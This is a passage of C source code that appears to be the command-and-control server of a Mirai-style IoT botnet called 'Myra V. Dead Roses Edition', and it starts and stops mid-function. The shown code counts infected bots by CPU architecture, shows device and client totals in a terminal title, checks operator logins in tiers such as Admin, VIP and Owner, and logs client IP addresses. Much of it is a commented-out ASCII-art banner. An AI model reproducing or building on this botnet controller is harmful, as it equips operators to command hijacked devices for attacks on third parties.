            break;    // Break This Function. Terminate.
          }
        }

        if (done) // Only If Value, Is [Done] ( Equal To 0 )
        {
          client->transmitted_successfully = 0; // Display Our Devices, This Is One The Client Side.
          client->arm = 0;                      // Display Our Devices, This Is One The Client Side.
          client->mips = 0;                     // Display Our Devices, This Is One The Client Side.
          client->sh4 = 0;                      // Display Our Devices, This Is One The Client Side.
          client->x86 = 0;                      // Display Our Devices, This Is One The Client Side.
          client->spc = 0;                      // Display Our Devices, This Is One The Client Side.
          client->ppc = 0;                      // Display Our Devices, This Is One The Client Side.
          close(clear_myra_broadcast);
        }
      }
    }
  }
}

unsigned int myra_arm_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].arm)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}
unsigned int myra_mipsel_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].mips)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int myra_x86_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].x86)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int myra_spc_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].spc)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int myra_ppc_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].ppc)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int myra_sh4_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].sh4)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

unsigned int myra_clients_connected() // Create An Unsigned Integer, For Our Device
{
  int trim_integer = 0, total_output = 0;                                          // Stating First Integer [int == 0,] - The Total, Will ALso Be NULL [ 0 ]
  for (trim_integer = 0; trim_integer < max_file_descriptor_value; trim_integer++) // We Shall Set The File Descriptor Maximum For I.
  {
    if (!clients[trim_integer].transmitted_successfully)
      continue;     // Continue, After Device Statement.
    total_output++; // Total Device Value
  }

  return total_output; // Return Statement Terminates The Execution Of a Function And Returns Control To The Calling Function
}

void *myra_title_creator(void *sock) // We Shall Create A Window Title For The Screen
{
  int clear_myra_broadcast = (long int)sock; // Creating A 'Long' Integer, For socket_propulsion_data output
  char string[3000];                         // Char Every Line For Output Communication
  while (1)                                  // While == Wait 1 Second, This Is Stable
  {
    memset(string, 0, 3000);
    sprintf(string, "%c]0; Myra V. Dead Roses Edition. | Devices: %d | Clients: %d %c", '\033', myra_clients_connected(), successful_transmission, '\007'); // [Title]
    if (send(clear_myra_broadcast, string, strlen(string), MSG_NOSIGNAL) == -1)
      ;       // Send Output Response
    sleep(2); // Sleep, So No Concurrent Processes Create Any Problems
  }
}

int myra_file_searcher_v3(char *target_string) // Char Every Line For Output Communication [Search In File]
{
  FILE *fp;                                 // FILE*fp - File Pointer
  int line_numerical = 0;                   // Create Integer For Each Line Number
  int result_found_data = 0, find_line = 0; // Create Integer For Each Line Number
  char temp[512];                           // Char [512]

  if ((fp = fopen("myra-db-set.txt", "r")) == NULL)
  {              // [Login.txt Output]
    return (-1); // Return Value
  }
  while (fgets(temp, 512, fp) != NULL)
  { // temp -- 512
    if ((strstr(temp, target_string)) != NULL)
    {                             // Constant Char Communication Between Unsigned_Integer.
      result_found_data++;        // Finding Output Value
      find_line = line_numerical; // Find Line, Then Put Under Line_Numerical
    }
    line_numerical++; // Line Output -- Line Total
  }
  if (fp)       // Check
    fclose(fp); // Kill

  if (result_found_data == 0)
    return 0; // Result Output

  return find_line;
}
void myra_client_address(struct sockaddr_in addr)
{                                                                                              // Client Adress -- To Socket Adress
  printf("\e[38;5;168mIP\e[38;5;134m:[\e[38;5;168m%d.%d.%d.%d\e[38;5;134m]\n",                 // Display User IP Output
         addr.sin_addr.s_addr & 0xFF,                                                          // 0xFF --> + Whatever Stated Value
         (addr.sin_addr.s_addr & 0xFF00) >> 8,                                                 // 0xFF --> + Whatever Stated Value
         (addr.sin_addr.s_addr & 0xFF0000) >> 16,                                              // 0xFF --> + Whatever Stated Value
         (addr.sin_addr.s_addr & 0xFF000000) >> 24);                                           // 0xFF --> + Whatever Stated Value
  FILE *myra_log_file;                                                                         // Create IP Log
  myra_log_file = fopen("logs/Myra_IP.log", "a");                                              // Output The File
  fprintf(myra_log_file, "\n\e[38;5;168mIP\e[38;5;134m:[\e[38;5;168m%d.%d.%d.%d\e[38;5;134m]", // IP Format, Via The Following.
          addr.sin_addr.s_addr & 0xFF,                                                         // 0xFF --> Whatever Stated Value
          (addr.sin_addr.s_addr & 0xFF00) >> 8,                                                // 0xFF --> Whatever Stated Value
          (addr.sin_addr.s_addr & 0xFF0000) >> 16,                                             // 0xFF --> Whatever Stated Value
          (addr.sin_addr.s_addr & 0xFF000000) >> 24);                                          // 0xFF --> Whatever Stated Value
  fclose(myra_log_file);                                                                       // Close The Log File
}
// struct msghdr {
//     void         *msg_name;       /* optional address */
//     socklen_t     msg_namelen;    /* size of address */
//     struct iovec *msg_iov;        /* scatter/gather array */
//     size_t        msg_iovlen;     /* # elements in msg_iov */
//     void         *msg_control;    /* ancillary data, see below */
//     size_t        msg_controllen; /* ancillary data buffer len */
//     int           msg_flags;      /* flags on received message */
//
void *myra_telnet_data(void *sock)
{                                                       // Here Is Where The Magic Happens
  int clear_myra_broadcast = (int)sock;                 // Create Integer For socket_propulsion_data
  successful_transmission++;                            // State Manages Connected
  int find_line;                                        // Create Integer For Find Line Function
  pthread_t title;                                      // Use pthread To Output Title
  char counter[3000];                                   // Char Every Line For Output Communication
  memset(counter, 0, 3000);                             // Fill Data Block - [3000]
  char myra_buffer_size[3000];                          // Char Every Line For Output Communication
  char *write_string;                                   // Char Every Line For Output Communication
  char usernamez[80];                                   // Char Every Line For Output Communication
  char *password;                                       // Char Every Line For Output Communication
  char *Admin = "Admin";                                // Char Every Line For Output Communication
  char *Normal = "Normal";                              // Char Every Line For Output Communication
  char *VIP = "VIP";                                    // Char Every Line For Output Communication
  char *Owner = "Owner";                                // Char Every Line For Output Communication
  memset(myra_buffer_size, 0, sizeof myra_buffer_size); // Fill Data Block - [myra_buffer_size]
  char myra[3000];                                      // Char Every Line For Output Communication
  memset(myra, 0, 3000);                                // Fill Data Block - [3000]
  /*
  Here we are animating ASCII art to move 
  to the middle of the screen.

  I am sure there must be a much more efficient
  way of doing this.
  */
  //char test_001 [5000];
  //char test_002 [5000];
  //char test_003 [5000];
  //char test_004 [5000];
  //char test_005 [5000];
  //char test_006 [5000];
  //char test_007 [5000];
  //char test_008 [5000];
  //char test_009 [5000];
  //char test_010 [5000];
  //char test_011 [5000];
  //char test_012 [5000];
  //char test_013 [5000];
  //char test_014 [5000];
  //char test_015 [5000];
  //char test_016 [5000];
  //char test_017 [5000];
  ////        0
  //char test_018 [5000];
  //char test_019 [5000];
  //char test_020 [5000];
  //char test_021 [5000];
  //char test_022 [5000];
  //char test_023 [5000];
  //char test_024 [5000];
  //char test_025 [5000];
  //char test_026 [5000];
  //char test_027 [5000];
  //char test_028 [5000];
  //char test_029 [5000];
  //char test_030 [5000];
  //char test_031 [5000];
  //char test_032 [5000];
  //char test_033 [5000];
  //char test_034 [5000];
  ////        0
  //char test_035 [5000];
  //char test_036 [5000];
  //char test_037 [5000];
  //char test_038 [5000];
  //char test_039 [5000];
  //char test_040 [5000];
  //char test_041 [5000];
  //char test_042 [5000];
  //char test_043 [5000];
  //char test_044 [5000];
  //char test_045 [5000];
  //char test_046 [5000];
  //char test_047 [5000];
  //char test_048 [5000];
  //char test_049 [5000];
  //char test_050 [5000];
  //char test_051 [5000];
  ////        0
  //char test_052 [5000];
  //char test_053 [5000];
  //char test_054 [5000];
  //char test_055 [5000];
  //char test_056 [5000];
  //char test_057 [5000];
  //char test_058 [5000];
  //char test_059 [5000];
  //char test_060 [5000];
  //char test_061 [5000];
  //char test_062 [5000];
  //char test_063 [5000];
  //char test_064 [5000];
  //char test_065 [5000];
  //char test_066 [5000];
  //char test_067 [5000];
  //char test_068 [5000];
  ////        0
  //char test_069 [5000];
  //char test_070 [5000];
  //char test_071 [5000];
  //char test_072 [5000];
  //char test_073 [5000];
  //char test_074 [5000];
  //char test_075 [5000];
  //char test_076 [5000];
  //char test_077 [5000];
  //char test_078 [5000];
  //char test_079 [5000];
  //char test_080 [5000];
  //char test_081 [5000];
  //char test_082 [5000];
  //char test_083 [5000];
  //char test_084 [5000];
  //char test_085 [5000];
  ////
  //char test_086 [5000];
  //char test_087 [5000];
  //char test_088 [5000];
  //char test_089 [5000];
  //char test_090 [5000];
  //char test_091 [5000];
  //char test_092 [5000];
  //char test_093 [5000];
  //char test_094 [5000];
  //char test_095 [5000];
  //char test_096 [5000];
  //char test_097 [5000];
  //char test_098 [5000];
  //char test_099 [5000];
  //char test_100 [5000];
  //char test_101 [5000];
  //char test_102 [5000];
  ////
  //char test_103 [5000];
  //char test_104 [5000];
  //char test_105 [5000];
  //char test_106 [5000];
  //char test_107 [5000];
  //char test_108 [5000];
  //char test_109 [5000];
  //char test_110 [5000];
  //char test_111 [5000];
  //char test_112 [5000];
  //char test_113 [5000];
  //char test_114 [5000];
  //char test_115 [5000];
  //char test_116 [5000];
  //char test_117 [5000];
  //char test_118 [5000];
  //char test_119 [5000];
  /*        
#Cyan =  \e[38;5;168m   
#Pink =  \e[38;5;225m  
#White = \e[38;5;134m"    
*/
  //sprintf(test_001,  "\e[38;5;134m                 ╗        \r\n");
  //sprintf(test_002,  "\e[38;5;134m                 ║   ╔    \r\n");
  //sprintf(test_003,  "\e[38;5;134m                 ║   ║    \r\n");
  //sprintf(test_004,  "\e[38;5;134m                 ║╔╦═╝    \r\n");
  //sprintf(test_005,  "\e[38;5;134m                 ╚╣║      \r\n");
  //sprintf(test_006,  "\e[38;5;134m                  ║╠═══╝  \r\n");
  //sprintf(test_007,  "\e[38;5;134m              \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_008,  "\e[38;5;134m            ╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_009,  "\e[38;5;134m            ║ V.║         \r\n");
  //sprintf(test_010,  "\e[38;5;134m    ╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_011,  "\e[38;5;134m      \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_012,  "\e[38;5;134m     ╔═══╣║               \r\n");
  //sprintf(test_013,  "\e[38;5;134m         ║╠╗              \r\n");
  //sprintf(test_014,  "\e[38;5;134m       ╔═╩╝║              \r\n");
  //sprintf(test_015,  "\e[38;5;134m       ║   ║              \r\n");
  //sprintf(test_016,  "\e[38;5;134m       ╝   ║              \r\n");
  //sprintf(test_017,  "\e[38;5;134m           ╚              \r\n");
  //// Clear - Sleep 1
  //sprintf(test_018,  "\e[38;5;134m                     ╗        \r\n");
  //sprintf(test_019,  "\e[38;5;134m                     ║   ╔    \r\n");
  //sprintf(test_020,  "\e[38;5;134m                     ║   ║    \r\n");
  //sprintf(test_021,  "\e[38;5;134m                     ║╔╦═╝    \r\n");
  //sprintf(test_022,  "\e[38;5;134m                     \e[38;5;225m╚╣║      \r\n");
  //sprintf(test_023,  "\e[38;5;134m                      \e[38;5;225m║╠═══╝  \r\n");
  //sprintf(test_024,  "\e[38;5;134m                  \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_025,  "\e[38;5;134m                ╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_026,  "\e[38;5;134m                ║ V.║         \r\n");
  //sprintf(test_027,  "\e[38;5;134m        ╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_028,  "\e[38;5;134m          \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_029,  "\e[38;5;134m         \e[38;5;225m╔═══╣║               \r\n");
  //sprintf(test_030,  "\e[38;5;134m             \e[38;5;225m║╠╗              \r\n");
  //sprintf(test_031,  "\e[38;5;134m           ╔═╩╝║              \r\n");
  //sprintf(test_032,  "\e[38;5;134m           ║   ║              \r\n");
  //sprintf(test_033,  "\e[38;5;134m           ╝   ║              \r\n");
  //sprintf(test_034,  "\e[38;5;134m               ╚              \r\n");
  //// Clear - Sleep 1
  //sprintf(test_035,  "\e[38;5;134m                         ╗        \r\n");
  //sprintf(test_036,  "\e[38;5;134m                         ║   ╔    \r\n");
  //sprintf(test_037,  "\e[38;5;134m                         ║   ║    \r\n");
  //sprintf(test_038,  "\e[38;5;134m                         \e[38;5;225m║╔╦═╝    \r\n");
  //sprintf(test_039,  "\e[38;5;134m                         \e[38;5;225m╚╣║      \r\n");
  //sprintf(test_040,  "\e[38;5;134m                          \e[38;5;225m║╠═══╝  \r\n");
  //sprintf(test_041,  "\e[38;5;134m                      \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_042,  "\e[38;5;134m                    \e[38;5;225m╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_043,  "\e[38;5;134m                    ║ V.║         \r\n");
  //sprintf(test_044,  "\e[38;5;134m            \e[38;5;225m╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_045,  "\e[38;5;134m              \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_046,  "\e[38;5;134m             \e[38;5;225m╔═══╣║               \r\n");
  //sprintf(test_047,  "\e[38;5;134m                 \e[38;5;225m║╠╗              \r\n");
  //sprintf(test_048,  "\e[38;5;134m               \e[38;5;225m╔═╩╝║              \r\n");
  //sprintf(test_049,  "\e[38;5;134m               ║   ║              \r\n");
  //sprintf(test_050,  "\e[38;5;134m               ╝   ║              \r\n");
  //sprintf(test_051,  "\e[38;5;134m                   ╚              \r\n");
  //// Clear - Sleep 1
  //sprintf(test_052,  "\e[38;5;134m                             ╗        \r\n");
  //sprintf(test_053,  "\e[38;5;134m                             ║   ╔    \r\n");
  //sprintf(test_054,  "\e[38;5;134m                             \e[38;5;225m║   ║    \r\n");
  //sprintf(test_055,  "\e[38;5;134m                             \e[38;5;225m║╔╦═╝    \r\n");
  //sprintf(test_056,  "\e[38;5;134m                             \e[38;5;225m╚╣║      \r\n");
  //sprintf(test_057,  "\e[38;5;134m                              \e[38;5;225m║╠═══╝  \r\n");
  //sprintf(test_058,  "\e[38;5;134m                          \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_059,  "\e[38;5;134m                        \e[38;5;225m╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_060,  "\e[38;5;134m                        ║ V.║         \r\n");
  //sprintf(test_061,  "\e[38;5;134m                \e[38;5;225m╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_062,  "\e[38;5;134m                  \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_063,  "\e[38;5;134m                 \e[38;5;225m╔═══╣║               \r\n");
  //sprintf(test_064,  "\e[38;5;134m                     \e[38;5;225m║╠╗              \r\n");
  //sprintf(test_065,  "\e[38;5;134m                   \e[38;5;225m╔═╩╝║              \r\n");
  //sprintf(test_066,  "\e[38;5;134m                   \e[38;5;225m║   ║              \r\n");
  //sprintf(test_067,  "\e[38;5;134m                   ╝   ║              \r\n");
  //sprintf(test_068,  "\e[38;5;134m                       ╚              \r\n");
  //// Clear - Sleep 1
  //sprintf(test_069,  "\e[38;5;134m                                 ╗        \r\n");
  //sprintf(test_070,  "\e[38;5;134m                                 \e[38;5;225m║   ╔    \r\n");
  //sprintf(test_071,  "\e[38;5;134m                                 \e[38;5;225m║   ║    \r\n");
  //sprintf(test_072,  "\e[38;5;134m                                 \e[38;5;225m║╔╦═╝    \r\n");
  //sprintf(test_073,  "\e[38;5;134m                                 \e[38;5;225m╚╣║      \r\n");
  //sprintf(test_074,  "\e[38;5;134m                                  \e[38;5;225m║╠═══╝  \r\n");
  //sprintf(test_075,  "\e[38;5;134m                              \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_076,  "\e[38;5;134m                            \e[38;5;225m╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_077,  "\e[38;5;134m                            ║ V.║         \r\n");
  //sprintf(test_078,  "\e[38;5;134m                    \e[38;5;225m╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_079,  "\e[38;5;134m                      \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_080,  "\e[38;5;134m                     \e[38;5;225m╔═══╣║               \r\n");
  //sprintf(test_081,  "\e[38;5;134m                         \e[38;5;225m║╠╗              \r\n");
  //sprintf(test_082,  "\e[38;5;134m                       \e[38;5;225m╔═╩╝║              \r\n");
  //sprintf(test_083,  "\e[38;5;134m                       \e[38;5;225m║   ║              \r\n");
  //sprintf(test_084,  "\e[38;5;134m                       \e[38;5;225m╝   ║              \r\n");
  //sprintf(test_085,  "\e[38;5;134m                           ╚              \r\n");
  //// Clear - Sleep 1
  //sprintf(test_086,  "\e[38;5;134m                                     \e[38;5;225m╗        \r\n");
  //sprintf(test_087,  "\e[38;5;134m                                     \e[38;5;225m║   ╔    \r\n");
  //sprintf(test_088,  "\e[38;5;134m                                     \e[38;5;225m║   ║    \r\n");
  //sprintf(test_089,  "\e[38;5;134m                                     \e[38;5;225m║╔╦═╝    \r\n");
  //sprintf(test_090,  "\e[38;5;134m                                     \e[38;5;225m╚╣║      \r\n");
  //sprintf(test_091,  "\e[38;5;134m                                      \e[38;5;225m║╠═══╝  \r\n");
  //sprintf(test_092,  "\e[38;5;134m                                  \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_093,  "\e[38;5;134m                                \e[38;5;225m╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_094,  "\e[38;5;134m                                ║ V.║         \r\n");
  //sprintf(test_095,  "\e[38;5;134m                        \e[38;5;225m╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_096,  "\e[38;5;134m                          \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_097,  "\e[38;5;134m                         \e[38;5;225m╔═══╣║               \r\n");
  //sprintf(test_098,  "\e[38;5;134m                             \e[38;5;225m║╠╗              \r\n");
  //sprintf(test_099,  "\e[38;5;134m                           \e[38;5;225m╔═╩╝║              \r\n");
  //sprintf(test_100,  "\e[38;5;134m                           \e[38;5;225m║   ║              \r\n");
  //sprintf(test_101,  "\e[38;5;134m                           \e[38;5;225m╝   ║              \r\n");
  //sprintf(test_102,  "\e[38;5;134m                               \e[38;5;225m╚              \r\n");
  //// Clear - Sleep 1
  //sprintf(test_103,  "\e[38;5;134m                                         \e[38;5;225m╗        \r\n");
  //sprintf(test_104,  "\e[38;5;134m                                         \e[38;5;225m║   ╔    \r\n");
  //sprintf(test_105,  "\e[38;5;134m                                         \e[38;5;225m║   ║    \r\n");
  //sprintf(test_106,  "\e[38;5;134m                                         \e[38;5;225m║╔╦═╝    \r\n");
  //sprintf(test_107,  "\e[38;5;134m                                         \e[38;5;225m╚╣║      \r\n");
  //sprintf(test_108,  "\e[38;5;134m                                          \e[38;5;225m║╠═══╝  \r\n");
  //sprintf(test_109,  "\e[38;5;134m                                      \e[38;5;225m╔═══╝╚══╗   \r\n");
  //sprintf(test_110,  "\e[38;5;134m                                    \e[38;5;225m╔═╩═╗     ╚═╝ \r\n");
  //sprintf(test_111,  "\e[38;5;134m                                    \e[38;5;225m║ \e[38;5;168mV\e[38;5;134m.\e[38;5;225m║         \r\n");
  //sprintf(test_112,  "\e[38;5;134m                            \e[38;5;225m╔═╗     ╚═╦═╝         \r\n");
  //sprintf(test_113,  "\e[38;5;134m                              \e[38;5;225m╚══╗╔═══╝           \r\n");
  //sprintf(test_114,  "\e[38;5;134m                             \e[38;5;225m╔═══╣║               \r\n");
  //sprintf(test_115,  "\e[38;5;134m                                 \e[38;5;225m║╠╗              \r\n");
  //sprintf(test_116,  "\e[38;5;134m                               \e[38;5;225m╔═╩╝║              \r\n");
  //sprintf(test_117,  "\e[38;5;134m                               \e[38;5;225m║   ║              \r\n");
  //sprintf(test_118,  "\e[38;5;134m                               \e[38;5;225m╝   ║              \r\n");
  //sprintf(test_119,  "\e[38;5;134m                                   \e[38;5;225m╚              \r\n");
  //if (send(clear_myra_broadcast, test_001, strlen(test_001), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_002, strlen(test_002), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_003, strlen(test_003), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_004, strlen(test_004), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_005, strlen(test_005), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_006, strlen(test_006), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_007, strlen(test_007), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_008, strlen(test_008), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_009, strlen(test_009), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_010, strlen(test_010), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_011, strlen(test_011), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_012, strlen(test_012), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_013, strlen(test_013), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_014, strlen(test_014), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_015, strlen(test_015), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_016, strlen(test_016), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_017, strlen(test_017), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(1);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  ////
  //if (send(clear_myra_broadcast, test_018, strlen(test_018), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_019, strlen(test_019), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_020, strlen(test_020), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_021, strlen(test_021), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_022, strlen(test_022), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_023, strlen(test_023), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_024, strlen(test_024), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_025, strlen(test_025), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_026, strlen(test_026), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_027, strlen(test_027), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_028, strlen(test_028), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_029, strlen(test_029), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_030, strlen(test_030), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_031, strlen(test_031), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_032, strlen(test_032), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_033, strlen(test_033), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_034, strlen(test_034), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(1);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  ////
  //if (send(clear_myra_broadcast, test_035, strlen(test_035), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_036, strlen(test_036), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_037, strlen(test_037), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_038, strlen(test_038), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_039, strlen(test_039), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_040, strlen(test_040), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_041, strlen(test_041), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_042, strlen(test_042), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_043, strlen(test_043), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_044, strlen(test_044), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_045, strlen(test_045), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_046, strlen(test_046), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_047, strlen(test_047), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_048, strlen(test_048), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_049, strlen(test_049), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_050, strlen(test_050), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_051, strlen(test_051), MSG_NOSIGNAL) == -1) goto finish_integer;
  //sleep(1);
  //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
  ////
  //if (send(clear_myra_broadcast, test_052, strlen(test_052), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_053, strlen(test_053), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_054, strlen(test_054), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_055, strlen(test_055), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_056, strlen(test_056), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_057, strlen(test_057), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_058, strlen(test_058), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_059, strlen(test_059), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_060, strlen(test_060), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_061, strlen(test_061), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_062, strlen(test_062), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_063, strlen(test_063), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_064, strlen(test_064), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_065, strlen(test_065), MSG_NOSIGNAL) == -1) goto finish_integer;
  //if (send(clear_myra_broadcast, test_066, strlen(test_066), MSG_NOSIGNAL) == -1) goto finish_integer;
